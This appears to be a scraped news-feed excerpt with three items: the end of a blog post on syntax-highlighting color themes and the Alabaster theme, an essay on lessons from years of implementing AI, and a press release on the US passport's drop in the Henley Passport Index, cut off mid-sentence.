        <p>Punctuation: it helps to separate names from syntax a little bit, and you care about names first, especially when quickly scanning code.</p>
        <p>Please, please don’t highlight language keywords. <code>class</code>, <code>function</code>, <code>if</code>, <code>else</code>stuff like this. You rarely look for them: “where’s that if” is a valid question, but you will be looking not at the <code>if</code> the keyword, but at the condition after it. The condition is the important, distinguishing part. The keyword is not.</p>
        <p>Highlight names and constants. Grey out punctuation. Don’t highlight language keywords.</p>
        
        <p>The tradition of using grey for comments comes from the times when people were paid by line. If you have something like</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/javadoc.webp?t=1760553996" width="720" height="610">        </figure>
        <p>of course you would want to grey it out! This is bullshit text that doesn’t add anything and was written to be ignored.</p>
        <p>But for good comments, the situation is opposite. Good comments ADD to the code. They explain something that couldn’t be expressed directly. They are <em>important</em>.</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/yellow_comments.webp?t=1760553996" width="720" height="190">        </figure>
        <p>So here’s another controversial idea:</p>
        <p>Comments should be highlighted, not hidden away.</p>
        <p>Use bold colors, draw attention to them. Don’t shy away. If somebody took the time to tell you something, then you want to read it.</p>
        
        <p>Another secret nobody is talking about is that there are two types of comments:</p>
        <ol start="1">
          <li>Explanations</li>
          <li>Disabled code</li>
        </ol>
        <p>Most languages don’t distinguish between those, so there’s not much you can do syntax-wise. Sometimes there’s a convention (e.g. <code>--</code> vs <code>/* */</code> in SQL), then use it!</p>
        <p>Here’s a real example from Clojure codebase that makes perfect use of two types of comments:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/two_types_of_comments.webp?t=1760553996" width="720" height="540"><figcaption>Disabled code is gray, explanation is bright yellow</figcaption>        </figure>
        <h2 id="light-or-dark">Light or dark?</h2>
        <p>Per statistics, 70% of developers prefer dark themes. Being in the other 30%, that question always puzzled me. Why?</p>
        <p>And I think I have an answer. Here’s a typical dark theme:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/vscode_default_dark@2x.webp?t=1760553996" width="720" height="240">        </figure>
        <p>and here’s a light one:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/vscode_default_light@2x.webp?t=1760553996" width="720" height="240">        </figure>
        <p>On the latter one, colors are way less vibrant. Here, I picked them out for you:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/vscode_colors@2x.png?t=1760553996" width="720" height="300"><figcaption>Notice how many colors there are. No one can remember that many.</figcaption>        </figure>
        <p>This is because dark colors are in general less distinguishable and more muddy. Look at Hue scale as we move brightness down:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/brightness_hue@2x.webp?t=1760553996" width="720" height="175">        </figure>
        <p>Basically, in the dark part of the spectrum, you just get fewer colors to play with. There’s no “dark yellow” or good-looking “dark teal”.</p>
        <p>Nothing can be done here. There are no magic colors hiding somewhere that have both good contrast on a white background and look good at the same time. By choosing a light theme, you are dooming yourself to a very limited, bad-looking, barely distinguishable set of dark colors.</p>
        <p>So it makes sense. Dark themes do look better. Or rather: light ones can’t look good. Science ¯\_(ツ)_/¯</p>
        <p>But!</p>
        <p>But.</p>
        <p>There is one trick you can do, that I don’t see a lot of. Use background colors! Compare:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/bg_highlight@2x.png?t=1760553996" width="720" height="336">        </figure>
        <p>The first one has nice colors, but the contrast is too low: letters become hard to read.</p>
        <p>The second one has good contrast, but you can barely see colors.</p>
        <p>The last one has <em>both</em>: high contrast and clean, vibrant colors. Lighter colors are readable even on a white background since they fill a lot more area. Text is the same brightness as in the second example, yet it gives the impression of clearer color. It’s all upside, really.</p>
        <p>UI designers know about this trick for a while, but I rarely see it applied in code editors:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/badge.png?t=1760553996" width="531" height="360">        </figure>
        <p>If your editor supports choosing background color, give it a try. It might open light themes for you.</p>
        <h2 id="bold-and-italics">Bold and italics</h2>
        <p>Don’t use. This goes into the same category as too many colors. It’s just another way to highlight something, and you don’t need too many, because you can’t highlight everything.</p>
        <p>In theory, you might try to <em>replace</em> colors with typography. Would that work? I don’t know. I haven’t seen any examples.</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/typography.png?t=1760553996" width="720" height="240"><figcaption>Using italics and bold instead of colors</figcaption>        </figure>
        <h2 id="myth-of-number-based-perfection">Myth of number-based perfection</h2>
        <p>Some themes pay too much attention to be scientifically uniform. Like, all colors have the same exact lightness, and hues are distributed evenly on a circle.</p>
        <p>This could be nice (to know if you have OCR), but in practice, it doesn’t work as well as it sounds:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/balanced.png?t=1760553996" width="720" height="323"><figcaption>OkLab l=0.7473 c=0.1253 h=0, 45, 90, 135, 180, 225, 270, 315</figcaption>        </figure>
        <p>The idea of highlighting is to make things stand out. If you make all colors the same lightness and chroma, they will look very similar to each other, and it’ll be hard to tell them apart.</p>
        <p>Our eyes are way more sensitive to differences in lightness than in color, and we should use it, not try to negate it.</p>
        <h2 id="lets-design-a-color-theme-together">Let’s design a color theme together</h2>
        <p>Let’s apply these principles step by step and see where it leads us. We start with the theme from the start of this post:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi00.png?t=1760553996" width="720" height="240">        </figure>
        <p>First, let’s remove highlighting from language keywords and re-introduce base text color:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi10.png?t=1760553996" width="720" height="240">        </figure>
        <p>Next, we remove color from variable usage:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi20.png?t=1760553996" width="720" height="240">        </figure>
        <p>and from function/method invocation:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi30.png?t=1760553996" width="720" height="240">        </figure>
        <p>The thinking is that your code is mostly references to variables and method invocation. If we highlight those, we’ll have to highlight more than 75% of your code.</p>
        <p>Notice that we’ve kept variable declarations. These are not as ubiquitous and help you quickly answer a common question: where does thing thing come from?</p>
        <p>Next, let’s tone down punctuation:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi40.png?t=1760553996" width="720" height="240">        </figure>
        <p>I prefer to dim it a little bit because it helps names stand out more. Names alone can give you the general idea of what’s going on, and the exact configuration of brackets is rarely equally important.</p>
        <p>But you might roll with base color punctuation, too:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi40_alt.png?t=1760553996" width="720" height="240">        </figure>
        <p>Okay, getting close. Let’s highlight comments:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi50.png?t=1760553996" width="720" height="240">        </figure>
        <p>We don’t use red here because you usually need it for squiggly lines and errors.</p>
        <p>This is still one color too many, so I unify numbers and strings to both use green:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi60.png?t=1760553996" width="720" height="240">        </figure>
        <p>Finally, let’s rotate colors a bit. We want to respect nesting logic, so function declarations should be brighter (yellow) than variable declarations (blue).</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi70.png?t=1760553996" width="720" height="240">        </figure>
        <p>Compare with what we started:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi00.png?t=1760553996" width="720" height="240">        </figure>
        <p>In my opinion, we got a much more workable color theme: it’s easier on the eyes and helps you find stuff faster.</p>
        <h2 id="shameless-plug-time">Shameless plug time</h2>
        <p>I’ve been applying these principles for <a href="https://github.com/tonsky/vscode-theme-alabaster/commit/5c840f5fb57e5cd0dce93ac8c450495bdb0a2658" target="_blank">about 8 years now</a>.</p>
        <p>I call this theme Alabaster and I’ve built it a couple of times for the editors I used:</p>
        <ul>
          <li><a href="https://github.com/tonsky/vscode-theme-alabaster" target="_blank">VS Code</a></li>
          <li><a href="https://github.com/tonsky/intellij-alabaster" target="_blank">JetBrains IDEs</a></li>
          <li><a href="https://github.com/tonsky/sublime-scheme-alabaster" target="_blank">Sublime Text</a> (<a href="https://github.com/tonsky/clojure-sublimed/?tab=readme-ov-file#color-scheme" target="_blank">twice</a>)</li>
        </ul>
        <p>It’s also been ported to many other editors and terminals; the most complete list is <a href="https://github.com/tonsky/sublime-scheme-alabaster?tab=readme-ov-file#variations-1" target="_blank">probably here</a>. If your editor is not on the list, try searching for it by name—it might be built-in already! I always wondered where these color themes come from, and now I became an author of one (and I still don’t know).</p>
        <p>Feel free to use Alabaster as is or build your own theme using the principles outlined in the article—either is fine by me.</p>
        <p>As for the principles themselves, they worked out fantastically for me. I’ve never wanted to go back, and just one look at any “traditional” color theme gives me a scare now.</p>
        <p>I <em>suspect</em> that the only reason we don’t see more restrained color themes is that people never really thought about it. Well, this is your wake-up call. I hope this will inspire people to use color more deliberately and to change the default way we build and use color themes.</p>
        
      </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Things I've learned in my 7 years implementing AI (124 pts)]]></title>
            <link>https://www.jampa.dev/p/llms-and-the-lessons-we-still-havent</link>
            <guid>45596602</guid>
            <pubDate>Wed, 15 Oct 2025 18:27:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jampa.dev/p/llms-and-the-lessons-we-still-havent">https://www.jampa.dev/p/llms-and-the-lessons-we-still-havent</a>, See on <a href="https://news.ycombinator.com/item?id=45596602">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>Even though the impacts of LLMs have never been seen before, they feel familiar to earlier assumptions. </p><p><span>For context: I wasn’t the “PhD scientist,” working on models. I was the guy who worked on productionizing their proof-of-concept code and turning it into something people could actually use. I worked in industries ranging from software/hardware automated testing at </span><em>Motorola</em><span> to small startups dealing with accessibility and education.</span></p><p>So here is what I've learned:</p><p>This AI hype cycle is missing the mark by building ChatGPT-like bots and “✨” buttons that perform single OpenAI API calls. </p><p>For example, Notion, Slack, and Airtable now lead with “AI” in their page titles instead of the core value they provide. Slack calls itself “AI Work Management &amp; Productivity Tools,” but has anyone chosen Slack for its AI features?</p><p>Most of these companies seem lost on how to implement AI. A simple vector semantic search on Slack would outperform what they’ve shipped as “AI” so far.</p><p><span>People don’t use these products due to these “✨” AI solutions. The best AI applications work beneath the surface to empower users. Jeff Bezos comments about this</span><strong><span>&nbsp;(</span><a href="https://www.aboutamazon.com/news/company-news/2016-letter-to-shareholders" rel="">in 2016!</a><span>)</span></strong><span> </span></p><p><span>You don’t see AI as a chatbot on the Amazon homepage. You see it in </span><em>“demand forecasting, product search ranking, product and deals recommendations, merchandising placements, fraud detection, translations.”</em></p><p><span>That’s where AI comes in, </span><strong>not as </strong><em><strong>“the thing”</strong></em><span>&nbsp;but as “</span><em><strong>the tool that gets you to the thing</strong></em><span>.” </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!zW4W!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!zW4W!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 424w, https://substackcdn.com/image/fetch/$s_!zW4W!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 848w, https://substackcdn.com/image/fetch/$s_!zW4W!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 1272w, https://substackcdn.com/image/fetch/$s_!zW4W!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!zW4W!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png" width="219" height="367.46067415730334" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:448,&quot;width&quot;:267,&quot;resizeWidth&quot;:219,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Tasks&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="Tasks" title="Tasks" srcset="https://substackcdn.com/image/fetch/$s_!zW4W!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 424w, https://substackcdn.com/image/fetch/$s_!zW4W!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 848w, https://substackcdn.com/image/fetch/$s_!zW4W!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 1272w, https://substackcdn.com/image/fetch/$s_!zW4W!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8c0bb330-3693-4452-a22c-45030a197ec2_267x448.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Relevant XKCD, which is not relevant anymore…</figcaption></figure></div><p>What if a problem that took a team of PhDs one year to solve could be solved better in four hours? That's when LLM shines:</p><p>When I worked on accessibility for nonverbal people, one of our projects aimed to make communication cards (“I want,” “Eat,” “Yes,” “No”) context-aware to allow nonverbals to express their desires faster, similar to an autocomplete.</p><p>For example, the user is home at 7 AM and taps “I want to eat” card. </p><p>The next cards should anticipate their needs (which are more likely to be breakfast items), but there are caveats: What a person typically eats for breakfast depends on their country, the type of establishment they are in (home, hotel, restaurant), the day of the week, and, of course, current personal preferences, which also change over time.</p><p><span>After a year of work, our team of researchers from two universities achieved a&nbsp;</span><strong>55% rate</strong><span>&nbsp;(of the suggested options). It was a massive success at the time. We even won an award for best accessibility solution.</span></p><p><span>When ChatGPT 3.5 was released, I replicated a solution for this project and, after hacking over the weekend, got an </span><strong>82% accuracy rate</strong><span> when running against the same test database.</span></p><p><span>AI skeptics ask, </span><em>“If AI is so good, why don’t we see a lot of new startups?”</em><span> Ask any founder. Coding isn’t even close to the most challenging part of creating a startup.</span></p><p>What I do see is a boom in internal tools. </p><p>This year alone, I shipped projects that would never have been viable. As an engineering manager, spending weeks coding means neglecting the team. </p><p>The “Nice to have” bucket is when a project dies. It means there is no engineering capacity to tackle it, so it goes into the backlog limbo—until now.</p><p>Now, I can build these projects using Claude, running prompts, and reviewing the output between meetings. I see many people releasing new things that are incredibly helpful and productive, which would not have happened without Claude or Cursor.  </p><p>Like with all tools before it, we’re coming closer to the top of the S-curve for LLMs:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!FJXo!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!FJXo!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 424w, https://substackcdn.com/image/fetch/$s_!FJXo!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 848w, https://substackcdn.com/image/fetch/$s_!FJXo!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 1272w, https://substackcdn.com/image/fetch/$s_!FJXo!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!FJXo!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png" width="568" height="282.8296703296703" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/cb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:725,&quot;width&quot;:1456,&quot;resizeWidth&quot;:568,&quot;bytes&quot;:116752,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.jampa.dev/i/175824043?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!FJXo!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 424w, https://substackcdn.com/image/fetch/$s_!FJXo!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 848w, https://substackcdn.com/image/fetch/$s_!FJXo!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 1272w, https://substackcdn.com/image/fetch/$s_!FJXo!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcb1dc51e-8b89-4b7d-bac8-de656fb2ecf9_1969x980.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Note: Take this graph with a grain of salt. It is hard to compare earlier models because most benchmarks came much later.</figcaption></figure></div><p>The last releases were unimpressive. Does anyone know a real application where ChatGPT 5 can do something that o3 could not?</p><p>The good news is that what we have is enough for most people. AI tools like KNNs are very limited but still valuable today. </p><p>This also kills the reverse FOMO: “If I wait for the technology to mature, I won’t have to deal with their earlier quirks,” is less relevant now.</p><p>But AI research is definitely not over: We will still see cheaper, faster, and open models, like those that can run on a mobile device and are as capable as ChatGPT 4o.</p><p><strong>Creating</strong><span> AI models is hard, but </span><strong>working</strong><span> </span><strong>with</strong><span> them is simple. I put off implementing earlier AI tools because I couldn’t grasp how neural networks, sigmoids, and all that worked. Then someone said, “What are you doing? If you want to apply the technology, just use Scikit-learn.”</span></p><p>If you’ve never used AI for coding, install Claude Code and start using it for small tasks. That gets you 70% of AI’s current benefits without diving into prompt optimization or chain-of-thought mechanics.</p><p>Eventually, you’ll need to learn to leverage LLMs better when you hit bottlenecks. You will realize that you will still need to review code and CLI commands. You will naturally be better at prompting. You will know when and when not to use it.</p><p>AI is the new Agile: something simple, that makes you faster but has limits, yet people will position it as the solution for every problem, preaching: “Oh, you’re using (AI / Agile) wrong. In fact, it seems like what you need is even more of (AI / Agile)”</p><p>The tool has limits, especially when breaking new ground. LLMs are limited by their training data. For example, when I tried to vibecode a mod for a recently released Unity game, the AI failed to complete even a basic hook.</p><p>Automatic railway gates replaced crossing attendants. But if those gates worked 99% of the time (or even 99.99%), would that be good enough? </p><p>LLMs are very far from being 99% accurate. They fix problems, but they tend to miss the root cause. I see many cases where the LLM suggested a fix by adding multiple lines, which an experienced engineer did by removing one. </p><p>Recognizing this requires senior-level skills, such as valuing simplicity over complexity and knowledge gained from dealing with similar bugs in the past.</p><p><span>This creates a problem for juniors, who, when using LLMs</span><strong>,</strong><span> will have problem-solving done for them and won’t develop this skill, hurting their code reviewing abilities. I see many companies that have stopped hiring juniors altogether.</span></p><p><span>The Internet was a bubble in 1999, and you know the result. </span><s>The internet died completely, but it was good for a while. Man, I miss the Internet.</s></p><p>But seriously, we are seeing great tools coming to boost productivity, a new era of AI memes, while VCs and Big Tech pay for most of them. It’s a win-win.</p><p><span>Also, here is my current favorite SORA video: (Warning: </span><strong>LOUD</strong><span>)</span></p><p><span>(I had to remove the video because a bug in Substack causes the space bar to play the video instead of scrolling down—sorry for the jumpscare. Here’s the Reddit link instead: </span><a href="https://www.reddit.com/r/SoraAi/comments/1nwcx9e/some_body_cam_footage/" rel="">https://www.reddit.com/r/SoraAi/comments/1nwcx9e/some_body_cam_footage/</a><span>)</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!bVkL!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!bVkL!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 424w, https://substackcdn.com/image/fetch/$s_!bVkL!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 848w, https://substackcdn.com/image/fetch/$s_!bVkL!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 1272w, https://substackcdn.com/image/fetch/$s_!bVkL!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!bVkL!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png" width="1468" height="846" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:846,&quot;width&quot;:1468,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:695055,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.jampa.dev/i/175824043?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56a4b699-4ae3-4f82-a2ad-97d71af68d12_1468x846.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!bVkL!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 424w, https://substackcdn.com/image/fetch/$s_!bVkL!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 848w, https://substackcdn.com/image/fetch/$s_!bVkL!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 1272w, https://substackcdn.com/image/fetch/$s_!bVkL!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F02e01a7d-95be-404e-bdc0-bc7847c40fe6_1468x846.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[US Passport Power Falls to Historic Low (128 pts)]]></title>
            <link>https://www.henleyglobal.com/newsroom/press-releases/henley-global-mobility-report-oct-2025</link>
            <guid>45595746</guid>
            <pubDate>Wed, 15 Oct 2025 17:20:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.henleyglobal.com/newsroom/press-releases/henley-global-mobility-report-oct-2025">https://www.henleyglobal.com/newsroom/press-releases/henley-global-mobility-report-oct-2025</a>, See on <a href="https://news.ycombinator.com/item?id=45595746">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <p>For the first time since the <a href="https://www.henleyglobal.com/passport-index">Henley Passport Index</a> was created 20 years ago, the United States is no longer ranked amongst the world’s Top 10 most powerful passports. Once unrivalled at No.1 in 2014, the American passport has now slumped to 12<sup>th</sup> place, tied with Malaysia, with visa-free access to only 180 of 227 destinations worldwide. The Asian trifecta of Singapore (access to 193 destinations visa-free), South Korea (190 destinations), and Japan (189 destinations) now occupy the top three spots on the index powered by exclusive data from the <a href="https://www.iata.org/" target="_blank">International Air Transport Association</a> (IATA) and ranking all the world’s passports based on the number of destinations their holders can enter without a prior visa.</p><p>The decline of the US passport and its most recent drop from 10<sup>th</sup> to 12<sup>th</sup> position on the index has been driven by a series of access changes. The loss of visa-free access to Brazil in April due to a lack of reciprocity, and the US being left out of China’s rapidly expanding visa-free list, marked the start of its downward slide. This was followed by adjustments from Papua New Guinea and Myanmar, which further eroded the US score while boosting other passports. Most recently, Somalia’s launch of a new eVisa system and Vietnam’s decision to exclude the US from its latest visa-free additions delivered the final blow, pushing it out of the Top 10.</p><p><a href="https://www.henleyglobal.com/about/key-people/christian-h-kalin">Dr. Christian H. Kaelin</a>, Chairman of Henley &amp; Partners and creator of the Henley Passport Index, says these seemingly small changes have had outsized consequences — underscoring just how finely balanced the global mobility landscape has become. “The declining strength of the US passport over the past decade is more than just a reshuffle in rankings — it signals a fundamental shift in global mobility and soft power dynamics. Nations that embrace openness and cooperation are surging ahead, while those resting on past privilege are being left behind.”</p><p>Similarly, the UK passport has fallen to its lowest-ever position on the index, slipping two places since July, from 6<sup>th</sup> to 8<sup>th</sup> place, despite also once holding the top spot (in 2015).</p><p><strong>Visa Reciprocity Matters More</strong></p><p>While American passport holders can currently access 180 destinations visa-free, the US itself allows only 46 other nationalities to enter without a visa. This puts it way down in 77<sup>th</sup> place on the <a href="https://www.henleyglobal.com/publications/henley-openness-index">Henley Openness Index</a>, which ranks all 199 countries and territories worldwide according to the number of nationalities they permit entry to without a prior visa.</p><p>This disparity between visa free access and openness is one of the widest globally — second only to Australia, and just ahead of Canada, New Zealand, and Japan. Interestingly, all five nations with the biggest gaps between the travel freedom they enjoy and the openness they offer have either stagnated or declined in their passport power ranking over the past decade.</p><p><a href="https://www.henleyglobal.com/publications/henley-private-wealth-migration-report-2025/americas-hard-line-immigration">Annie Pforzheimer</a>, Senior Associate at the Center for Strategic and International Studies in Washington, notes that America’s retreat is rooted in politics. “Even before a second Trump presidency, US policy had turned inward. That isolationist mindset is now being reflected in America’s loss of passport power.”</p><p>This more insular stance has hit developing nations particularly hard. President Trump has suspended visa issuance to travelers from 12 nations across Africa, the Middle East and Southeast Asia, imposed heavy restrictions on an additional seven, and threatened bans on up to 36 more, the majority of them in Africa. A visa bond of USD 5,000 to 15,000 now applies to seven African nations, refundable only upon departure. Plans are also underway to introduce a blanket USD 250 